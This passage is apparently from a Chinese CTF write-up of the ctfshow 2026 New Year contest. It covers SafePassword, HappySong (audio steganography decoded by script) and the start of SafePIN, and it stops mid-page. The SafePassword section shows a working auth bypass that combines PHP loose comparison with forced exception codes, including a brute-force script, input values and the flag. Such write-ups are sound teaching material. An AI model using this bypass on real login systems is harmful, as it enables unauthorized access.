$_SESSION[&#x27;authed&#x27;] === true;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function inErrorCodes(int $code): bool</span><br><span class="line">&#123;</span><br><span class="line">    return in_array($code, ERROR_CODES, true);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function buildExpectedHash($channelKey): string</span><br><span class="line">&#123;</span><br><span class="line">    try&#123;</span><br><span class="line">        if (!preg_match(&#x27;/[\x00-\x08\x0B\x0C\x0E-\x1F]/&#x27;, $channelKey) &amp;&amp; strlen($channelKey) &lt; 64) &#123;</span><br><span class="line">            return md5(&#x27;ctfshow:&#x27; . $channelKey . &#x27;:verify&#x27; . $secret_salt);</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            throw new RuntimeException(&#x27;&#x27;, LENGTH_ERROR);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;catch(Throwable $e)&#123;</span><br><span class="line">        throw new RuntimeException(&#x27;&#x27;, VERIFY_FAILED);</span><br><span class="line">    &#125;</span><br><span class="line">       </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function pickErrorCode(Throwable $e): int</span><br><span class="line">&#123;</span><br><span class="line">    $code = (int)$e-&gt;getCode();</span><br><span class="line">    if (inErrorCodes($code)) &#123;</span><br><span class="line">        return $code;</span><br><span class="line">    &#125;</span><br><span class="line">    $idx = abs((int)crc32(get_class($e) . &#x27;|&#x27; . $e-&gt;getMessage())) % count(ERROR_CODES);</span><br><span class="line">    return ERROR_CODES[$idx];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function getExpectedHash($channelKey)</span><br><span class="line">&#123;</span><br><span class="line">    try &#123;</span><br><span class="line">        return buildExpectedHash($channelKey);</span><br><span class="line">    &#125; catch (Throwable $e) &#123;</span><br><span class="line">        return pickErrorCode($e);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$flash = &#x27;&#x27;;</span><br><span class="line">$flashType = &#x27;info&#x27;;</span><br><span class="line"></span><br><span class="line">$action = $_POST[&#x27;action&#x27;] ?? ($_GET[&#x27;action&#x27;] ?? &#x27;&#x27;);</span><br><span class="line">if (!is_string($action)) &#123;</span><br><span class="line">    $action = &#x27;&#x27;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if ($_SERVER[&#x27;REQUEST_METHOD&#x27;] === &#x27;POST&#x27;) &#123;</span><br><span class="line">    if ($action === &#x27;login&#x27;) &#123;</span><br><span class="line">        requirePostCsrf();</span><br><span class="line"></span><br><span class="line">        $accessKey = $_POST[&#x27;access_key&#x27;] ?? &#x27;&#x27;;</span><br><span class="line">        $channelKey = $_POST[&#x27;channel_key&#x27;] ?? &#x27;&#x27;;</span><br><span class="line">        $expected = getExpectedHash($channelKey);</span><br><span class="line"></span><br><span class="line">        if (md5($accessKey) == $expected) &#123;</span><br><span class="line">            $_SESSION[&#x27;authed&#x27;] = true;</span><br><span class="line">            $flash = &#x27;验证通过：已解锁资料权限。&#x27;;</span><br><span class="line">            $flashType = &#x27;ok&#x27;;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $_SESSION[&#x27;authed&#x27;] = false;</span><br><span class="line">            $flash = &#x27;验证失败：请检查访问密钥。&#x27;;</span><br><span class="line">            $flashType = &#x27;err&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; elseif ($action === &#x27;logout&#x27;) &#123;</span><br><span class="line">        requirePostCsrf();</span><br><span class="line">        $_SESSION = [];</span><br><span class="line">        if (ini_get(&#x27;session.use_cookies&#x27;)) &#123;</span><br><span class="line">            $params = session_get_cookie_params();</span><br><span class="line">            setcookie(session_name(), &#x27;&#x27;, time() - 42000, $params[&#x27;path&#x27;], $params[&#x27;domain&#x27;], (bool)$params[&#x27;secure&#x27;], (bool)$params[&#x27;httponly&#x27;]);</span><br><span class="line">        &#125;</span><br><span class="line">        session_destroy();</span><br><span class="line">        session_start();</span><br><span class="line">        $flash = &#x27;已退出。&#x27;;</span><br><span class="line">        $flashType = &#x27;info&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$csrf = ensureCsrf();</span><br><span class="line"></span><br><span class="line">$flagText = &#x27;请先登陆&#x27;;</span><br><span class="line">if (isLoggedIn()) &#123;</span><br><span class="line">    if (isset($flag) &amp;&amp; is_string($flag) &amp;&amp; $flag !== &#x27;&#x27;) &#123;</span><br><span class="line">        $flagText = $flag;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $flagText = &#x27;&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$templatePath = __DIR__ . &#x27;/template.html&#x27;;</span><br><span class="line">if (!is_file($templatePath)) &#123;</span><br><span class="line">    http_response_code(500);</span><br><span class="line">    exit(&#x27;Template missing&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">$html = file_get_contents($templatePath);</span><br><span class="line">if ($html === false) &#123;</span><br><span class="line">    http_response_code(500);</span><br><span class="line">    exit(&#x27;Template read error&#x27;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$authed = isLoggedIn();</span><br><span class="line"></span><br><span class="line">echo strtr($html, [</span><br><span class="line">    &#x27;&#123;&#123;CSRF&#125;&#125;&#x27; =&gt; h($csrf),</span><br><span class="line">    &#x27;&#123;&#123;AUTHED&#125;&#125;&#x27; =&gt; $authed ? &#x27;1&#x27; : &#x27;0&#x27;,</span><br><span class="line">    &#x27;&#123;&#123;FLAG&#125;&#125;&#x27; =&gt; $authed ? h($flagText) : &#x27;&#x27;,</span><br><span class="line">    &#x27;&#123;&#123;FLASH_TYPE&#125;&#125;&#x27; =&gt; h($flashType),</span><br><span class="line">    &#x27;&#123;&#123;FLASH_MSG&#125;&#125;&#x27; =&gt; h($flash),</span><br><span class="line">]);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<img src="/2026/01/04/CTFSHOW-2026%E5%85%83%E6%97%A6%E8%B7%A8%E5%B9%B4%E6%AC%A2%E4%B9%90%E8%B5%9B-CS2026-%E4%B8%AA%E4%BA%BA%E5%86%99%E7%9A%84%E9%83%A8%E5%88%86wp/image-20260104150148352.png" class="" title="SafePassword登录界面">


<p>分析php代码,我们需要满足 index.php 中的登录条件：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if (md5($accessKey) == $expected) &#123;</span><br><span class="line">    $_SESSION[&#x27;authed&#x27;] = true;</span><br><span class="line">    // ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里使用了 &#x3D;&#x3D;（弱比较）。如果 $expected 是一个数字（整数），PHP 会尝试将 md5($accessKey) 这个字符串转换为数字进行比较。</p>
<p>控制 $expected 的值：<br>$expected 的值来自于 getExpectedHash($channelKey)。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">function getExpectedHash($channelKey) &#123;</span><br><span class="line">    try &#123;</span><br><span class="line">        return buildExpectedHash($channelKey);</span><br><span class="line">    &#125; catch (Throwable $e) &#123;</span><br><span class="line">        return pickErrorCode($e);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>观察 buildExpectedHash 函数：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">function buildExpectedHash($channelKey): string &#123;</span><br><span class="line">    try &#123;</span><br><span class="line">        if (!preg_match(&#x27;/.../&#x27;, $channelKey) &amp;&amp; strlen($channelKey) &lt; 64) &#123;</span><br><span class="line">            // 正常情况返回 md5 字符串</span><br><span class="line">            return md5(&#x27;ctfshow:&#x27; . $channelKey . &#x27;:verify&#x27; . $secret_salt);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            // 如果长度 &gt;= 64，抛出 LENGTH_ERROR</span><br><span class="line">            throw new RuntimeException(&#x27;&#x27;, LENGTH_ERROR);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; catch(Throwable $e) &#123;</span><br><span class="line">        // 捕获所有异常（包括上面的 LENGTH_ERROR），转而抛出 VERIFY_FAILED (2025)</span><br><span class="line">        throw new RuntimeException(&#x27;&#x27;, VERIFY_FAILED);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>  如果我们提供的 channel_key 长度超过 64 个字符，内部 try 块会抛出异常。<br>  catch 块捕获后，重新抛出一个错误码为 VERIFY_FAILED（常量值为 2025）的异常。<br>  getExpectedHash 捕获这个新异常，调用 pickErrorCode，最终返回整数 2025。<br>  <strong>结论</strong>：只要 channel_key 长度大于 64，$expected 就会变成整数 2025。</p>
<p>  构造 $access_key：<br>  现在比较变成了：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if (md5($accessKey) == 2025) &#123; ... &#125;</span><br></pre></td></tr></table></figure>

<p>我们需要找到一个字符串 $accessKey，使得它的 MD5 值以 “2025” 开头，且第五位不是数字（即 a-f），这样 PHP 在进行弱类型转换时，会截取前面的 “2025” 将其转换为整数 2025，从而使等式成立。</p>
<p>例如：md5(“abc”) &#x3D; “2025a…” -&gt; 转换为数字 2025 -&gt; 2025 &#x3D;&#x3D; 2025 (True)。<br>注意：如果第五位是数字（如 “20251…”），则会被转换为 20251，不相等。</p>
<p>需要一个脚本计算 Access Key：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">// 寻找 md5($str) 以 &quot;2025&quot; 开头且后续非数字的字符串</span><br><span class="line">for ($i = 0; $i &lt; 10000000; $i++) &#123;</span><br><span class="line">    $hash = md5((string)$i);</span><br><span class="line">    if (substr($hash, 0, 4) === &#x27;2025&#x27; &amp;&amp; !is_numeric($hash[4])) &#123;</span><br><span class="line">        echo &quot;Found Access Key: $i \n&quot;;</span><br><span class="line">        echo &quot;Hash: $hash \n&quot;;</span><br><span class="line">        break;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>运行结果为：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Found Access Key: 434048 </span><br><span class="line">Hash: 2025a5bcb774da5ad1746af26547e357 </span><br></pre></td></tr></table></figure>

<p>php语言代码运行网址：</p>
<p>3v4l.org<br>网址：<a target="_blank" rel="noopener" href="https://3v4l.org/">https://3v4l.org/</a><br>菜鸟教程在线编辑器<br>网址：<a target="_blank" rel="noopener" href="https://www.runoob.com/try/runcode.php?filename=helloworld&type=php">https://www.runoob.com/try/runcode.php?filename=helloworld&amp;type=php</a><br>PHP Sandbox<br>网址：<a target="_blank" rel="noopener" href="https://sandbox.onlinephpfunctions.com/">https://sandbox.onlinephpfunctions.com/</a></p>
<p>在题目页面的表单中填写：</p>
<p>访问密钥 (access_key): 434048<br>保留码 (channel_key): aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa<br>（输入由 65 个或更多字符组成的任意字符串，只要触发长度限制异常即可）这里对应了上面超过64个字符会触发异常</p>
<img src="/2026/01/04/CTFSHOW-2026%E5%85%83%E6%97%A6%E8%B7%A8%E5%B9%B4%E6%AC%A2%E4%B9%90%E8%B5%9B-CS2026-%E4%B8%AA%E4%BA%BA%E5%86%99%E7%9A%84%E9%83%A8%E5%88%86wp/image-20260104151019697.png" class="" title="SafePassword解题Payload">


<p>所以flag为：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfshow&#123;832a75ba-6f7d-4f02-97a8-d8af4f65e746&#125;</span><br></pre></td></tr></table></figure>

<h2 id="4-HappySong"><a href="#4-HappySong" class="headerlink" title="4.HappySong"></a>4.HappySong</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">题目描述</span><br><span class="line">鼓声也可以很燃，虽然只有两个音节</span><br></pre></td></tr></table></figure>

<p>我对音频隐写不是很熟悉所以这题我是在AI的辅助下完成的，其实一提到常规的音频隐写，我就想到摩斯电码和二进制编码，这是我的第一反应。但怎么转换对我而言是个问题。我先用Audacity打开了这个音频文件。</p>
<p>这是AI对这题的回答：</p>
<img src="/2026/01/04/CTFSHOW-2026%E5%85%83%E6%97%A6%E8%B7%A8%E5%B9%B4%E6%AC%A2%E4%B9%90%E8%B5%9B-CS2026-%E4%B8%AA%E4%BA%BA%E5%86%99%E7%9A%84%E9%83%A8%E5%88%86wp/image-20260104152050773.png" class="" title="HappySong音频分析">


<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">波形图（下半部分）：我们可以看到明显的“脉冲”或“节拍”。它们的时间间隔看起来是相当固定的，这意味着它不像传统的摩斯电码那样依靠“长音”和“短音”的时长来区分，而是依靠 音色/频率 来区分。</span><br><span class="line">频谱图（上半部分）：这是解题的关键。请注意看每一条竖线（每一个节拍）的颜色和高度。</span><br><span class="line">有些竖线颜色更亮，且频率延伸得更高（由于高频分量更多，看起来更“高”）。</span><br><span class="line">有些竖线颜色较暗，频率集中在低频（看起来更“矮”）。</span><br><span class="line">结论：这通常是用两种不同的鼓声（比如底鼓 Kick 和军鼓 Snare/Hi-hat）来代表摩斯电码中的“点（.）”和“划（-）”。</span><br><span class="line">观察波形之间的“空隙”（Silence）。</span><br><span class="line"></span><br><span class="line">你可以看到这些节拍是被分成一组一组的。</span><br><span class="line">如果是二进制（ASCII）：通常每组会有 8 个节拍（代表 1 byte）。（也就是说节拍是固定的）</span><br><span class="line">如果是摩斯电码：每组的节拍数量是不固定的（因为摩斯电码中每个字母的长度不同，例如 E 是 .，而 Q 是 --.-）。</span><br><span class="line">观察你的图：</span><br><span class="line">最左边第一组似乎有 4 个音，第二组有 1 个音，第三组有 4 个音……（这个属实有点为难我了，我对音符的认识如同白痴）</span><br><span class="line">这验证了你的猜想：这是摩斯电码。</span><br></pre></td></tr></table></figure>

<p>这里我让AI编写了一个脚本，来解析这个wav文件：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line">import numpy as np</span><br><span class="line">from scipy.io import wavfile</span><br><span class="line">from scipy.signal import find_peaks</span><br><span class="line"></span><br><span class="line">def solve_drum_bits(file_path):</span><br><span class="line">    print(f&quot;正在分析: &#123;file_path&#125;&quot;)</span><br><span class="line">    </span><br><span class="line">    # 1. 读取音频</span><br><span class="line">    try:</span><br><span class="line">        rate, data = wavfile.read(file_path)</span><br><span class="line">    except Exception as e:</span><br><span class="line">        print(f&quot;错误: &#123;e&#125;&quot;)</span><br><span class="line">        return</span><br><span class="line"></span><br><span class="line">    if len(data.shape) &gt; 1: data = data.mean(axis=1) # 转单声道</span><br><span class="line">    </span><br><span class="line">    # 2. 寻找鼓点</span><br><span class="line">    # 根据你的日志，间隔非常短(0.12s)，所以 distance 设小一点</span><br><span class="line">    peaks, _ = find_peaks(data, distance=int(rate * 0.1), height=0.5)</span><br><span class="line">    print(f&quot;检测到 &#123;len(peaks)&#125; 个鼓点&quot;)</span><br><span class="line"></span><br><span class="line">    # 3. 提取特征 (0 或 1)</span><br><span class="line">    # 你的数据表明：低频~0.48，高频~0.95</span><br><span class="line">    # 我们取中间值 0.7 作为分界线</span><br><span class="line">    THRESHOLD = 0.7 </span><br><span class="line">    window_size = int(rate * 0.05)</span><br><span class="line">    </span><br><span class="line">    binary_string = &quot;&quot;</span><br><span class="line">    </span><br><span class="line">    print(&quot;\n开始解析二进制数据...&quot;)</span><br><span class="line">    for peak in peaks:</span><br><span class="line">        start = peak</span><br><span class="line">        end = min(peak + window_size, len(data))</span><br><span class="line">        segment = data[start:end]</span><br><span class="line">        </span><br><span class="line">        # FFT 频谱分析</span><br><span class="line">        fft_res = np.fft.fft(segment)</span><br><span class="line">        freqs = np.fft.fftfreq(len(segment), 1/rate)</span><br><span class="line">        magnitude = np.abs(fft_res)</span><br><span class="line">        </span><br><span class="line">        # 计算高频占比 (600Hz以上)</span><br><span class="line">        low_energy = np.sum(magnitude[(np.abs(freqs) &lt; 600)])</span><br><span class="line">        high_energy = np.sum(magnitude[(np.abs(freqs) &gt;= 600)])</span><br><span class="line">        total = low_energy + high_energy</span><br><span class="line">        if total == 0: ratio = 0</span><br><span class="line">        else: ratio = high_energy / total</span><br><span class="line">        </span><br><span class="line">        # === 核心逻辑修改 ===</span><br><span class="line">        # 如果占比 &gt; 0.7 (0.95那一档)，记为 &#x27;1&#x27;</span><br><span class="line">        # 如果占比 &lt; 0.7 (0.48那一档)，记为 &#x27;0&#x27;</span><br><span class="line">        if ratio &gt; THRESHOLD:</span><br><span class="line">            binary_string += &quot;1&quot;</span><br><span class="line">        else:</span><br><span class="line">            binary_string += &quot;0&quot;</span><br><span class="line"></span><br><span class="line">    print(f&quot;提取到的二进制串 (长度&#123;len(binary_string)&#125;):\n&#123;binary_string&#125;\n&quot;)</span><br><span class="line"></span><br><span class="line">    # 4. 尝试解码为 ASCII 字符</span><br><span class="line">    # 每 8 位一组转换</span><br><span class="line">    print(&quot;-&quot; * 30)</span><br><span class="line">    print(&quot;尝试方案 A (0=低音, 1=高音):&quot;)</span><br><span class="line">    try:</span><br><span class="line">        chars = []</span><br><span class="line">        for i in range(0, len(binary_string), 8):</span><br><span class="line">            byte = binary_string[i:i+8]</span><br><span class="line">            if len(byte) == 8:</span><br><span class="line">                chars.append(chr(int(byte, 2)))</span><br><span class="line">        print(&quot;解码结果: &quot; + &quot;&quot;.join(chars))</span><br><span class="line">    except Exception as e:</span><br><span class="line">        print(f&quot;解码出错: &#123;e&#125;&quot;)</span><br><span class="line"></span><br><span class="line">    print(&quot;-&quot; * 30)</span><br><span class="line">    print(&quot;尝试方案 B (反转: 1=低音, 0=高音):&quot;)</span><br><span class="line">    # 有时候题目会故意反着来，备用方案</span><br><span class="line">    try:</span><br><span class="line">        inverted_bin = &quot;&quot;.join([&#x27;1&#x27; if b == &#x27;0&#x27; else &#x27;0&#x27; for b in binary_string])</span><br><span class="line">        chars = []</span><br><span class="line">        for i in range(0, len(inverted_bin), 8):</span><br><span class="line">            byte = inverted_bin[i:i+8]</span><br><span class="line">            if len(byte) == 8:</span><br><span class="line">                chars.append(chr(int(byte, 2)))</span><br><span class="line">        print(&quot;解码结果: &quot; + &quot;&quot;.join(chars))</span><br><span class="line">    except Exception as e:</span><br><span class="line">        print(f&quot;解码出错: &#123;e&#125;&quot;)</span><br><span class="line">    print(&quot;-&quot; * 30)</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    # 请确保路径正确</span><br><span class="line">    solve_drum_bits(r&#x27;C:\Users\Lenovo\Desktop\ctf\drum_bits.wav&#x27;) </span><br></pre></td></tr></table></figure>

<p>运行结果为：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">D:\py\python.exe C:\Users\Lenovo\Desktop\ctf\123.py </span><br><span class="line">正在分析: C:\Users\Lenovo\Desktop\ctf\drum_bits.wav</span><br><span class="line">检测到 208 个鼓点</span><br><span class="line"></span><br><span class="line">开始解析二进制数据...</span><br><span class="line">提取到的二进制串 (长度208):</span><br><span class="line">0101010110011100100010111001100110001100100101111001000010001000100001001001010110001010100011001000101110100000100111101010000010010001100101101001110010011010101000001000110010010000100100011001100010000010</span><br><span class="line"></span><br><span class="line">------------------------------</span><br><span class="line">尝试方案 A (0=低音, 1=高音):</span><br><span class="line">解码结果: U   </span><br><span class="line">------------------------------</span><br><span class="line">尝试方案 B (反转: 1=低音, 0=高音):</span><br><span class="line">解码结果: ªctfshow&#123;just_a_nice_song&#125;</span><br><span class="line">------------------------------</span><br><span class="line"></span><br><span class="line">进程已结束，退出代码为 0</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>flag为：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfshow&#123;just_a_nice_song&#125;</span><br></pre></td></tr></table></figure>

<p>至于脚本你们可以自己去研究。</p>
<h2 id="5-SafePIN"><a href="#5-SafePIN" class="headerlink" title="5.SafePIN"></a>5.SafePIN</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">题目描述</span><br><span class="line">绝对安全的身份认证系统</span><br></pre></td></tr></table></figure>

<p>这题也是音频有关的题，只不过考你的听力，把record.wav的声音与数字按下的声音对应上，输入正确顺序的PIN码就可以拿到flag.我的“听力”一向不好，所以我需要一些数据化的东西去对应。</p>
<img src="/2026/01/04/CTFSHOW-2026%E5%85%83%E6%97%A6%E8%B7%A8%E5%B9%B4%E6%AC%A2%E4%B9%90%E8%B5%9B-CS2026-%E4%B8%AA%E4%BA%BA%E5%86%99%E7%9A%84%E9%83%A8%E5%88%86wp/image-20260104153314418.png" class="" title="SafePIN验证系统界面">


<p>题目前端长这样，先下载record.wav,这题我依然可以用脚本处理，但是先要把每个数字对应某个频率，再与record.wav的频率去一一对应来找到频率相近的。</p>
<p>网页的源码是：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span 